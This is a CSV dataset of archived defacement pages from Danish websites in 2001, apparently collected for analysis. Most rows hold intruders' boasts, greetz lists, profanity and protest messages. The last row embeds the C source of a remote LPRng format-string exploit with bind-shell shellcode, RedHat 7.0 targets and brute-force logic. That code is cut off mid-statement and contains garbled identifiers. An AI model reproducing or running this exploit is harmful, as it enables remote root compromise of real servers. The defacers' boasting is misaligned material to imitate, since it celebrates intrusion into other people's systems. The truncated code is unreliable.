,Unnamed: 0.1,id,path,date,url,tld,text,linklist,processed_text,lowercase,ner_ent
was defaced by r00t. Shoutz go out to : Raid - VirusBust - SlageHammer - Serial - LethalMind - LifeWire [ViD] - TheSerpentMage - Dill - Javan - Twiztid187 - Shadow [x] Ragin Goblin - Snapping Drake - Mixter - Nigma - Zillion - b0ca [PaX] - blak - m0nk - Lopdas - asrael - glitch - shinter - f0re awgn - fatal1ty - DarkMan - LocKi - Evul - Cyrus - h4g1s - 0ggy DarK! - ETSMTL - el_guineo - TheMight - MostHated - jsb - fl33t .rain.forest.puppy - fyodor - Aleph1 - narr0w - Sil - km - Xato InnerPulse - SegFault - ThoughtCrime - Deviance - CyberArmy HackedWorld - ProGenic - ro0t.nu - SinTek - BlackCode - 303 Sinnerz - LoTek - DiS - InfoWar - DisInfo - Deadly - Rewted PacketStorm - AntiOffline - Hâçk§è¢Klåhñ - sSh - SecureRoot Insecure - Xt0rshun - Rush - l0pht - MindSec - Genocide2600 GeekNews - TechnoTronic - DefCon - SecurityFocus - SafeMode SlashDot - Phrack - HNC - HDC - cDc - FreshMeat - Attrition RootKit - U.S.S.R. - GhettoHackers - DarkTide - Beavuh - gH HNN - eEye - 2600 - NetNinja's - RootFest - H2k - RootShell el8 - ADM - w00w00 - freeLSD - Team Void - b0f - hack.co.za NMRC - BugTraq - WireTrip - Rhino9 - Team Teso - CyberBase7 RZR1911 - DOD - PWA - Laxity - PC - UCF - CLASS - CORE DSi - ECLiPSE - FALLEN - PDM - HYBRID - LND - EQUALITY E l l i c i t O r g a n i za t i o n R |t| X",[],sitewas defaced  shoutz go raid virusbust slagehammer serial lethalmind lifewire vid theserpentmage dill javan  shadow x ragin goblin snapping drake mixter nigma zillion  pax blak  lopdas asrael glitch shinter  awgn  darkman locki evul cyrus   dark etsmtl elguineo themight mosthated jsb  rainforestpuppy fyodor   sil km xato innerpulse segfault thoughtcrime deviance cyberarmy hackedworld progenic  sintek blackcode  sinnerz lotek dis infowar disinfo deadly rewted packetstorm antioffline hâçk§è¢klåhñ ssh secureroot insecure  rush  mindsec  geeknews technotronic defcon securityfocus safemode slashdot phrack hnc hdc cdc freshmeat attrition rootkit ussr ghettohackers darktide beavuh gh hnn eeye  netninjas rootfest  rootshell  adm  freelsd team void  hackcoza nmrc bugtraq wiretrip  team teso   dod pwa laxity pc ucf class core dsi eclipse fallen pdm hybrid lnd equality e l l c r g za r x,"/. this site
was defaced by r00t. shoutz go out to : raid - virusbust - slagehammer - serial - lethalmind - lifewire [vid] - theserpentmage - dill - javan - twiztid187 - shadow [x] ragin goblin - snapping drake - mixter - nigma - zillion - b0ca [pax] - blak - m0nk - lopdas - asrael - glitch - shinter - f0re awgn - fatal1ty - darkman - locki - evul - cyrus - h4g1s - 0ggy dark! - etsmtl - el_guineo - themight - mosthated - jsb - fl33t .rain.forest.puppy - fyodor - aleph1 - narr0w - sil - km - xato innerpulse - segfault - thoughtcrime - deviance - cyberarmy hackedworld - progenic - ro0t.nu - sintek - blackcode - 303 sinnerz - lotek - dis - infowar - disinfo - deadly - rewted packetstorm - antioffline - hâçk§è¢klåhñ - ssh - secureroot insecure - xt0rshun - rush - l0pht - mindsec - genocide2600 geeknews - technotronic - defcon - securityfocus - safemode slashdot - phrack - hnc - hdc - cdc - freshmeat - attrition rootkit - u.s.s.r. - ghettohackers - darktide - beavuh - gh hnn - eeye - 2600 - netninja's - rootfest - h2k - rootshell el8 - adm - w00w00 - freelsd - team void - b0f - hack.co.za nmrc - bugtraq - wiretrip - rhino9 - team teso - cyberbase7 rzr1911 - dod - pwa - laxity - pc - ucf - class - core dsi - eclipse - fallen - pdm - hybrid - lnd - equality e l l i c i t o r g a n i za t i o n r |t| x","['t. shoutz', '- locki - evul - cyrus - h4g1s - 0ggy', 'mindsec - genocide2600', 'technotronic - defcon', 'u.s.s.r.', '2600', 'cyberbase7']"
8483,8483,8483,/home/michael/Desktop/attrition_analysis/2001/04/07/www.aditus.dk/index.html,2001-04-07,www.aditus.dk/,dk,Hacked By Demonios Hacked by Demonios  - x-mvc   and   Jozelito,[],hacked demonios hacked demonios xmvc jozelito,hacked by demonios hacked by demonios  - x-mvc   and   jozelito,[]
9218,9218,9218,/home/michael/Desktop/attrition_analysis/2001/04/29/www.alkor-draka.dk/index.html,2001-04-29,www.alkor-draka.dk/,dk,Hack3d by JNB This site has been hacked by JNB [JNB2001@mail.com],[], jnb site hacked jnb ,hack3d by jnb this site has been hacked by jnb [jnb2001@mail.com],['jnb this site']
9312,9312,9312,/home/michael/Desktop/attrition_analysis/2001/04/01/www.toyota-esbjerg.dk/index.html,2001-04-01,www.toyota-esbjerg.dk/,dk,"Supreme Entity ownz Toyota! Supreme Entity
ownz Toyota! Brazil rulez! shoutz to Silver
Lords, Prime Suspectz, Data Cha0s, Crime Boys, iz c0rp, BHS,
f0ul, k4m1k4z3 and all that support us.",[],supreme entity ownz toyota supreme entityownz toyota brazil rulez shoutz silverlords prime suspectz data  crime boys iz    support us,"supreme entity ownz toyota! supreme entity
ownz toyota! brazil rulez! shoutz to silver
lords, prime suspectz, data cha0s, crime boys, iz c0rp, bhs,
f0ul, k4m1k4z3 and all that support us.","['supreme entity', 'ownz', 'toyota', 'supreme entity', 'toyota', 'brazil rulez', 'prime suspectz', 'bhs', 'k4m1k4z3']"
10741,10741,10741,/home/michael/Desktop/attrition_analysis/2001/03/01/www.bhi.dk/index.html,2001-03-01,www.bhi.dk/,dk,"Velkommen til bhi international momsagentur aps h3LLO ADMIN: u kn0w wHat, 1've g0t bad N3ws f0r y0u u ar3 0wn3d bY aLph4Num3Ric n0thinG w4s d3l3ted s0 d0nt h4ve t0 w0rk y0ur STUPID ass to rec0v3r gr33tZ:UKR-team, AcidFalz, Legion2000, InfernoZ, #DANGER#, Op3ra, Ph1L1p$ im 0ut Of thIs LAME b0x...s33 y4 l4t3r pe0pl3 ::0wNed bY aLph4Num3ric::","['dk/index_dk.html', 'gb/index_gb.html', 'de/index_de.html', 'fr/index_fr.html']",velkommen til bhi international momsagentur aps  admin u    bad    u             stupid ass   acidfalz  infernoz danger    lame      ,"velkommen til bhi international momsagentur aps h3llo admin: u kn0w what, 1've g0t bad n3ws f0r y0u u ar3 0wn3d by alph4num3ric n0thing w4s d3l3ted s0 d0nt h4ve t0 w0rk y0ur stupid ass to rec0v3r gr33tz:ukr-team, acidfalz, legion2000, infernoz, #danger#, op3ra, ph1l1p$ im 0ut of this lame b0x...s33 y4 l4t3r pe0pl3 ::0wned by alph4num3ric::","['velkommen til bhi', 'momsagentur aps h3llo', '0wn3d', 'gr33tz', 'acidfalz', 'legion2000', '#danger#', 'ph1l1p$', '0wned']"
11167,11167,11167,/home/michael/Desktop/attrition_analysis/2001/03/14/www.budweiser.dk/index.html,2001-03-14,www.budweiser.dk/,dk,"Owned bah Hackah Jak and Hackah KP of Hackweiser -=[ Owned Bah ]=- & -=[ Hacker Jak & Hacker KP]=- Oh yeah, the gimp and I went exploiting today and guess what we found... Your Site!@#$& Sup, I would like to say hackweiser > budweiser anyday, were gonna start makin our own fuckin brew!@#@% And besides that Hackweiser now has the best ""fuckin"" team there is... hah! Anyways... ermmmm... wellllll... uhhh give me a min... :-) blah fuck, ok, thats better.. hah heres KP, I will be right back... Hey bitches whats up? errrr I feel like god right now. Or at least the slut on god's lap. Dude this is a sexy domain. Also, everyone do me a favior and don't let Jak know. He walks like an old man right now. LOL Bye!",[],owned bah hackah jak hackah kp hackweiser owned bah hacker jak hacker kp oh yeah gimp went exploiting today guess found site sup would like say hackweiser budweiser anyday gonna start makin fuckin brew besides hackweiser best fuckin team hah anyways ermmmm wellllll uhhh give min blah fuck ok thats better hah heres kp right back hey bitches whats errrr feel like god right least slut gods lap dude sexy domain also everyone favior dont let jak know walks like old man right lol bye,"owned bah hackah jak and hackah kp of hackweiser -=[ owned bah ]=- & -=[ hacker jak & hacker kp]=- oh yeah, the gimp and i went exploiting today and guess what we found... your site!@#$& sup, i would like to say hackweiser > budweiser anyday, were gonna start makin our own fuckin brew!@#@% and besides that hackweiser now has the best ""fuckin"" team there is... hah! anyways... ermmmm... wellllll... uhhh give me a min... :-) blah fuck, ok, thats better.. hah heres kp, i will be right back... hey bitches whats up? errrr i feel like god right now. or at least the slut on god's lap. dude this is a sexy domain. also, everyone do me a favior and don't let jak know. he walks like an old man right now. lol bye!","['hackah jak', 'hackah kp', 'hackweiser', 'jak', 'today', 'site!@#$& sup', 'hackweiser', '> budweiser anyday', 'hackweiser', 'wellllll', 'uhhh', 'god', 'jak']"
11240,11240,11240,/home/michael/Desktop/attrition_analysis/2001/05/11/www.rts-webdesign.dk/index.html,2001-05-11,www.rts-webdesign.dk/,dk,how ya like this simple yet effective webdesign by infidelz ?? =),[],ya like simple yet effective webdesign infidelz,how ya like this simple yet effective webdesign by infidelz ?? =),[]
11244,11244,11244,/home/michael/Desktop/attrition_analysis/2001/05/11/www.pantera.dk/index.html,2001-05-11,www.pantera.dk/,dk,"»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ¿¿ ØWnËÐ ßÝ Azrael666 & RÎÊ1Ðe×TtÊr ?? «««««««««««««««««««««««««««««««««««« ØWnËÐ ßÝ Azrael666 & RÎÊ1Ðe×TtÊr GrEeTs: AnDeZ, GoRdZ, AnZiO, ArZoN, LuQuInHa, FaBaO(Rj) ,PeRiG0sO,-|- VÅMP¥RÅ -|-. 11/05/2001  -  03:00 hs.","['azrael666.htm', 'mailto:azrael666@ig.com.br']",»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ¿¿ øwnëð ßý  ×ttêr «««««««««««««««««««««««««««««««««««« øwnëð ßý  ×ttêr greets andez gordz anzio arzon luquinha fabaorj  våmp¥rå   hs,"»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»» ¿¿ øwnëð ßý azrael666 & rîê1ðe×ttêr ?? «««««««««««««««««««««««««««««««««««« øwnëð ßý azrael666 & rîê1ðe×ttêr greets: andez, gordz, anzio, arzon, luquinha, fabao(rj) ,perig0so,-|- våmp¥rå -|-. 11/05/2001  -  03:00 hs.","['azrael666 & rîê1ðe×ttêr', 'azrael666 & rîê1ðe×ttêr', 'gordz', 'luquinha', 'perig0so,-|- våmp¥rå -|-', '11/05/2001\xa0 -\xa0 03:00']"
11279,11279,11279,/home/michael/Desktop/attrition_analysis/2001/05/07/www.aaben.iteu.dtu.dk/index.html,2001-05-07,www.aaben.iteu.dtu.dk/,dk,"Oops! looks like H3LL Cr0w owned you. The /fag /kursister and /oplysning domains are owned too...ohohohoho..sorry...hellcrow@mail.com...Brazil Rulez...THX to tty0, curs3, spawn, fir3 hawk and 3vil b1rd",[],oops looks like   owned fag kursister oplysning owned tooohohohohosorryhellcrowmailcombrazil rulezthx   spawn  hawk  ,"oops! looks like h3ll cr0w owned you. the /fag /kursister and /oplysning domains are owned too...ohohohoho..sorry...hellcrow@mail.com...brazil rulez...thx to tty0, curs3, spawn, fir3 hawk and 3vil b1rd","['cr0w', 'brazil', 'rulez', 'curs3', 'fir3 hawk', '3vil']"
11329,11329,11329,/home/michael/Desktop/attrition_analysis/2001/05/07/www.dropdead.dk/index.html,2001-05-07,www.dropdead.dk/,dk,"Perfect.br... Perfect.br was here Mr.LoRd
DeviL - ScorpionKTX - ph4r0x Why do I like Cartoons? Well... I dunno... but
I DO like them =D §ëxträsh, ti amu!!!! =**=",[],perfectbr perfectbr mrlorddevil scorpionktx  like cartoons well dunno buti like §ëxträsh ti amu,"perfect.br... perfect.br was here mr.lord
devil - scorpionktx - ph4r0x why do i like cartoons? well... i dunno... but
i do like them =d §ëxträsh, ti amu!!!! =**=",[]
11664,11664,11664,/home/michael/Desktop/attrition_analysis/2001/05/08/www.witzen.dk/index.html,2001-05-08,www.witzen.dk/,dk,"Does anyone care? Stop the
terrorists... help Macedonia innocent people are dying and no one is doing
anything... if nothing less, at least get informed at help us spread
the word... put a link on your webpage... even on the site you defaced ---- no harm was done
during this deface nothing was deleted or dammaged all replaced files were backed up admin can and be
helped [ by BrainBug ] greetings to all my hommies at #makhack big thanks to CMB","['http://www.ok.mk', 'http://www.org.mk/tetovo', 'http://www.mia.com.mk', 'http://www.ok.mk', 'mailto:bbug@freemail.com.mk']",anyone care stop theterrorists help macedonia innocent people dying one doinganything nothing less least get informed help us spreadthe word put link webpage even site defaced harm doneduring deface nothing deleted dammaged replaced files backed admin behelped brainbug greetings hommies makhack big thanks cmb,"does anyone care? stop the
terrorists... help macedonia innocent people are dying and no one is doing
anything... if nothing less, at least get informed at help us spread
the word... put a link on your webpage... even on the site you defaced ---- no harm was done
during this deface nothing was deleted or dammaged all replaced files were backed up admin can and be
helped [ by brainbug ] greetings to all my hommies at #makhack big thanks to cmb","['macedonia', 'brainbug', 'makhack']"
11923,11923,11923,/home/michael/Desktop/attrition_analysis/2001/05/05/www.peugeot.dk/index.html,2001-05-05,www.peugeot.dk/,dk,Supreme Entity ownz Peugeot!! hohohohoho!,[],supreme entity ownz peugeot hohohohoho,supreme entity ownz peugeot!! hohohohoho!,"['supreme entity', 'ownz', 'peugeot']"
12270,12270,12270,/home/michael/Desktop/attrition_analysis/2001/05/06/www.aditus.dk/index.html,2001-05-06,www.aditus.dk/,dk,hacked by xst,[],hacked xst,hacked by xst,[]
13295,13295,13295,/home/michael/Desktop/attrition_analysis/2001/01/29/www.komud.dk/index.html,2001-01-29,www.komud.dk/,dk,looll.. ya site was 0wned by phr4x.. for the r00t-access crew.. big shout,[],looll ya site    crew big shout,looll.. ya site was 0wned by phr4x.. for the r00t-access crew.. big shout,"['looll', '0wned']"
13405,13405,13405,/home/michael/Desktop/attrition_analysis/2001/01/25/www.coca-cola.dk/index.html,2001-01-25,www.coca-cola.dk/,dk,"Defaced by MrFloat and Theli Stop the
torture! Torture is abhorrent. Torture is illegal.
Yet Torture is inflicted on men, women and children in well over half the
countries of the world. Despite the universal condemnation of torture, it is still used to extract
confessions, to interrogate, to punish or to intimidate. In Police stations and
prison cells, on city streets and in remote villages, torturers continue to
inflict physical agony and mental anguish. Their cruelty kills, or leaves scars
on the body and mind that last a lifetime. What you can do! We want to work with anyone who is
interested in the fight against torture. We want to collaborate with
individuals and organisations already working with human rights issues and with
organisations who may have members who would like to join our campaign. If you
would like to take a step to stamp out torture there are many ways in which you
can help us. Note: Im not connected to any of these
organisations, this is an individual action against torture, but for more info
you can visit these sites: Greetz to Argos, Rabbitramar, MrFloat,
^herman^, Marieke, Jan, Suzanne(meat=murder!).","['http://www.stoptorture.org/', 'http://www.amnesty.org/']",defaced mrfloat theli stop thetorture torture abhorrent torture illegalyet torture inflicted men women children well half thecountries world despite universal condemnation torture still used extractconfessions interrogate punish intimidate police stations andprison cells city streets remote villages torturers continue toinflict physical agony mental anguish cruelty kills leaves scarson body mind last lifetime want work anyone isinterested fight torture want collaborate withindividuals organisations already working human rights issues withorganisations may members would like join campaign youwould like take step stamp torture many ways youcan help us note im connected theseorganisations individual action torture infoyou visit sites greetz argos rabbitramar mrfloatherman marieke jan suzannemeatmurder,"defaced by mrfloat and theli stop the
torture! torture is abhorrent. torture is illegal.
yet torture is inflicted on men, women and children in well over half the
countries of the world. despite the universal condemnation of torture, it is still used to extract
confessions, to interrogate, to punish or to intimidate. in police stations and
prison cells, on city streets and in remote villages, torturers continue to
inflict physical agony and mental anguish. their cruelty kills, or leaves scars
on the body and mind that last a lifetime. what you can do! we want to work with anyone who is
interested in the fight against torture. we want to collaborate with
individuals and organisations already working with human rights issues and with
organisations who may have members who would like to join our campaign. if you
would like to take a step to stamp out torture there are many ways in which you
can help us. note: im not connected to any of these
organisations, this is an individual action against torture, but for more info
you can visit these sites: greetz to argos, rabbitramar, mrfloat,
^herman^, marieke, jan, suzanne(meat=murder!).","['theli', 'well over half', 'rabbitramar', 'jan']"
13548,13548,13548,/home/michael/Desktop/attrition_analysis/2001/01/02/www.snapseruten.dk/index.html,2001-01-02,www.snapseruten.dk/,dk,"h4cked? p hiler! you box is owned by a ninth grader! p eople: the shit going on with palestine is fucked up...give the palestinians a fucking place to live...the same for kashmir. s cript k idz: no more emailing me so i can help you be the l337est sh1z 3v3|2. d2sk! c hina: you suck cuz your communist! g reetz: digitalenemy, telnet2, 0x7f, WFD, GForce, Hackweiser, ElectronicSouls philer@hushmail.com p enetration !",[], p hiler box owned ninth grader p eople shit going palestine fucked upgive palestinians fucking place livethe kashmir cript k idz emailing help     c hina suck cuz communist g reetz digitalenemy   wfd gforce hackweiser electronicsouls philerhushmailcom p enetration,"h4cked? p hiler! you box is owned by a ninth grader! p eople: the shit going on with palestine is fucked up...give the palestinians a fucking place to live...the same for kashmir. s cript k idz: no more emailing me so i can help you be the l337est sh1z 3v3|2. d2sk! c hina: you suck cuz your communist! g reetz: digitalenemy, telnet2, 0x7f, wfd, gforce, hackweiser, electronicsouls philer@hushmail.com p enetration !","['ninth', 'palestine', 'palestinians', '3v3|2', 'hina', 'g reetz', 'digitalenemy', 'telnet2', 'hackweiser', 'electronicsouls philer@hushmail.com', 'p enetration']"
13911,13911,13911,/home/michael/Desktop/attrition_analysis/2001/02/23/www.club.hp.dk/index.html,2001-02-23,www.club.hp.dk/,dk,""" .:( Quit Crew ):. ..:: Defaced By TheGrimPhreaker ::.. oOo Q uit C rew oOo Shouts go to r00t-access, DownKaos, WFD, and all members of Q uit C rew. """,[],quit crew defaced thegrimphreaker ooo q uit c rew ooo shouts go  downkaos wfd members q uit c rew,""" .:( quit crew ):. ..:: defaced by thegrimphreaker ::.. ooo q uit c rew ooo shouts go to r00t-access, downkaos, wfd, and all members of q uit c rew. """,['downkaos']
14978,14978,14978,/home/michael/Desktop/attrition_analysis/2001/02/14/www.powerdata.dk/mirror.html,2001-02-14,www.powerdata.dk/,dk,"YOUR SECURITY WAS BROKEN This box/site was hacked by xst ;P the l33t
russian hacker. We russians 0wns the world.. let me correct that
a little bit We russians owns the Internet world ;> we are unstopable. ------------------------------------------ #include <stdio.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #include <sys/stat.h> #include <sys/types.h> #include <fcntl.h> #include <netinet/in.h> #include <arpa/inet.h> #include <netdb.h> #include <netinet/in.h> #include <arpa/inet.h> #define ADDRESS_BUFFER_SIZE   32+4 #define APPEND_BUFFER_SIZE    52 #define FORMAT_LENGTH        
512-8 #define NOPCOUNT      
200 #define SHELLCODE_COUNT      
1030 #define DELAY              
50000 /* usecs */ #define OFFSET_LIMIT      
5000 char shellcode[] = ""\x31\xdb\x31\xc9\x31\xc0\xb0\x46\xcd\x80"" ""\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"" ""\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"" ""\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0"" ""\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd"" ""\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9"" ""\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75"" ""\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08"" ""\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh""; struct target { char *os_name; u_long eip_address; u_long shellcode_address; unsigned int position; int written_bytes; int align; }; struct target targets[] = { { ""RedHat 7.0 - Guinesss    "",
0xbffff3d8, 0L, 300, 70, 2,        
}, { ""RedHat 7.0 - Guinesss-dev"", 0xbffff12c, 0L,
300, 70, 2,         }, { ""RedHat 7.0 - Guinessss   "", 0xbffff3d8,
0L, 300, 70, 2,         }, { NULL, 0L, 0L, 0, 0, 0 } }; static char address_buffer[ADDRESS_BUFFER_SIZE+1]; static char append_buffer[APPEND_BUFFER_SIZE+1]; static char shellcode_buffer[1024]; static char *hostname=NULL; static int offset; static struct hostent *he; int type=-1; int brute=-1, failure=1; void calculate_rets(u_long eip_addr, u_long shellcode_addr,
u_int previous, u_int addr_loc) { int i; unsigned int tmp = 0; unsigned int copied = previous; unsigned int num[4] = { (unsigned int) (shellcode_addr
& 0x000000ff), (unsigned int)((shellcode_addr
& 0x0000ff00) >> 8), (unsigned int)((shellcode_addr
& 0x00ff0000) >> 16), (unsigned int)((shellcode_addr
& 0xff000000) >> 24) }; memset (address_buffer, '\0', sizeof(address_buffer)); memset (append_buffer, '\0', sizeof(append_buffer)); for (i = 0; i < 4; i++) { while (copied > 0x100) copied
-= 0x100; if ( (i > 0) &&
(num[i-1] == num[i]) ) sprintf
(append_buffer+strlen(append_buffer), ""%%%d$n"", addr_loc+i); else if (copied < num[i]) { if (
(num[i] - copied) <= 10) { sprintf (append_buffer+strlen(append_buffer), ""%.*s"", (int)(num[i] - copied), ""security.is!""); copied += (num[i] - copied); sprintf (append_buffer+strlen(append_buffer), ""%%%d$n"", addr_loc+i);        
} else { sprintf (append_buffer+strlen(append_buffer), ""%%.%du"", num[i] - copied); copied += (num[i] - copied); sprintf (append_buffer+strlen(append_buffer), ""%%%d$n"", addr_loc+i);        
} } else { tmp
= ((num[i] + 0x100) - copied); sprintf
(append_buffer+strlen(append_buffer), ""%%.%du"", tmp); copied
+= ((num[i] + 0x100) - copied); sprintf
(append_buffer+strlen(append_buffer), ""%%%d$n"", addr_loc+i); } sprintf (address_buffer+strlen(address_buffer),
""%c%c%c%c"", (unsigned
char) ((eip_addr+i) & 0x000000ff), (unsigned
char)(((eip_addr+i) & 0x0000ff00) >> 8), (unsigned
char)(((eip_addr+i) & 0x00ff0000) >> 16), (unsigned
char)(((eip_addr+i) & 0xff000000) >> 24)); } while (strlen(address_buffer) < ADDRESS_BUFFER_SIZE) strcat (address_buffer,
""X""); #ifdef DEBUG printf (""\nGeneration complete:\nAddress:
""); for (i = 0; i < strlen(address_buffer);
i++) { if ( ((i % 4) == 0) &&
(i > 0) ) printf
("".""); printf (""%02x"", (unsigned
char)address_buffer[i]); } printf (""\nAppend: %s\n"", append_buffer); #endif return; } char *create_malicious_string(void) { static char format_buffer[FORMAT_LENGTH+1]; long addr1,addr2; int i; memset (format_buffer, '\0', sizeof(format_buffer)); targets[type].shellcode_address
= targets[type].eip_address + SHELLCODE_COUNT; addr1 = targets[type].eip_address; addr2 = targets[type].shellcode_address; calculate_rets (addr1, addr2,targets[type].written_bytes,
targets[type].position); (void)snprintf (format_buffer, sizeof(format_buffer)-1,
""%.*s%s"", targets[type].align, ""BBBB"", address_buffer); strncpy (address_buffer, format_buffer, sizeof(address_buffer)-1); strncpy (format_buffer, append_buffer, sizeof(format_buffer)-1); for(i = 0 ; i < NOPCOUNT ; i++) strcat(format_buffer, ""\x90""); strcat(format_buffer, shellcode); return (format_buffer); } int connect_victim() { int sockfd, n; struct sockaddr_in s; fd_set fd_stat; char buff[1024]; static char testcmd[256] = ""uname -a ; id ;\r\n""; s.sin_family = AF_INET; s.sin_port = htons (3879); s.sin_addr.s_addr = *(u_long *)he->h_addr; if ((sockfd = socket (AF_INET, SOCK_STREAM,
0)) < 0) { printf (""--- [5]
Unable to create socket!\n""); printf(""Exploit
failed!\n""); return -1; } if ((connect (sockfd, (struct sockaddr *)
&s, sizeof (s))) < 0) { return -1; } if(brute) printf(""+++ The eip_address is 0x%x\n\n"", targets[type].eip_address); printf(""-   [+] shell
located on %s\n"", hostname); printf(""-   [+] Enter
Commands at will\n\n""); failure = -1; FD_ZERO(&fd_stat); FD_SET(sockfd, &fd_stat); send(sockfd, testcmd, strlen(testcmd), 0); while(1) { FD_SET(sockfd,&fd_stat); FD_SET(0,&fd_stat); if(select(sockfd+1,&fd_stat,NULL,NULL,NULL)<0)
break; if( FD_ISSET(sockfd, &fd_stat) ) { if((n=read(sockfd,buff,sizeof(buff)))<0){ fprintf(stderr, ""EOF\n""); return 2; } if(write(1,buff,n)<0)break; } if ( FD_ISSET(0, &fd_stat) ) { if((n=read(0,buff,sizeof(buff)))<0){ fprintf(stderr,""EOF\n""); return 2; } if(send(sockfd,buff,n,0)<0) break; } } } void send_code(char *exploit_buffer) { int sockfd, n; struct sockaddr_in s; fd_set fd_stat; char recv[1024]; static char testcmd[256] = ""/bin/uname -a
; id ;\r\n""; s.sin_family = AF_INET; s.sin_port = htons (515); s.sin_addr.s_addr = *(u_long *)he->h_addr; if ((sockfd = socket (AF_INET, SOCK_STREAM,
0)) < 0) { printf (""--- [shit]
fucking thing aint working dawg :(!\n""); printf(""Exploit
failed!\n""); exit(-1); } if ((connect (sockfd, (struct sockaddr *)
&s, sizeof (s))) < 0) { printf (""--- [5]
Unable to connect to %s\n"", hostname); printf(""Shit failed,
%s aint  running LPD (FUCK)!\n"", hostname); exit(-1); } usleep(DELAY); if(write (sockfd, exploit_buffer, strlen(exploit_buffer))
< 0) { printf (""Couldn't write to socket %d"", sockfd); printf (""Exploit failed\n""); exit(2); } close(sockfd); connect_victim(); } void usage(char *program) { int i=0; printf(""SEClpd by Icefist of ElectronicSouls
! \n\n""); printf(""Usage: %s victim [\""brute\""] -t
type [-o offset] [-a align] [-p position] [-r eip_addr] [-c shell_addr]
[-w written_bytes] \n\n"", program); printf(""ie: ./SEClpd localhost -t 0 For
most redhat 7.0 boxes\n""); printf(""ie: ./SEClpd localhost brute -t
0 For brute forcing all redhat 7.0 boxes\n""); printf(""Types:\n\n""); while( targets[i].os_name != NULL) printf (""[ Type %d: 
[ %s ]\n"", i++, targets[i].os_name); } int main(int argc, char **argv) { char exploit_buffer[1024]; char *format = NULL; int c, brutecount=0; if(argc < 3) { usage(argv[0]); return 1; } hostname = argv[1]; if(!strncmp(argv[2], ""brute"", 5)) brute = 1; while(( c = getopt (argc,
argv, ""t:r:c:a:o:p:w:k""))!= EOF){ switch (c) { case
't': type = atoi(optarg); break; case
'r': targets[type].eip_address = strtoul(optarg, NULL, 16); break; case
'c': targets[type].shellcode_address = strtoul(optarg, NULL, 16); break; case
'a': targets[type].align = atoi(optarg); break; case
'o': offset = atoi(optarg); break; case
'p': targets[type].position = atoi(optarg); break; case
'w': targets[type].written_bytes = atoi(optarg); break; default: usage(argv[0]); return 1; } } if(type < 0) { printf(""You must specify a type!\n""); printf(""example: ./SEClpd victim -t
0\n""); return -1; } if ( (he = gethostbyname (hostname)) == NULL) { herror(""gethostbyname""); exit(1); } targets[type].shellcode_address = targets[type].eip_address
+ SHELLCODE_COUNT; printf(""+++ Security.is remote exploit for
LPRng/lpd by DiGiT\n\n""); printf(""+++ Exploit information\n""); printf(""+++ Victim: %s\n"", hostname); printf(""+++ Type: %d - %s\n"", type, targets[type].os_name); printf(""+++ Eip address: 0x%x\n"", targets[type].eip_address); printf(""+++ Shellcode address: 0x%x\n"",
targets[type].shellcode_address); printf(""+++ Position: %d\n"", targets[type].position); printf(""+++ Alignment: %d\n"", targets[type].align); printf(""+++ Offset %d\n"", offset); printf(""\n""); printf(""+++ Attacking %s with our format
string\n"", hostname); if( brute > 0 ) { vrintf(""+++ Brute force, time to root these mofuckah's
;>\n""); targets[type].eip_address =  0xbffffff0; while(failure) { memset(exploit_buffer, '\0', sizeof(exploit_buffer)); format = create_malicious_string(); strcpy(exploit_buffer, address_buffer); strcat(exploit_buffer, format); strcat(exploit_buffer, ""\n""); send_code(exploit_buffer); eargets[type].eip_address = 0xbffffff0 - offset; offset+=4; if (offset > OFFSET_LIMIT) { printf(""+++
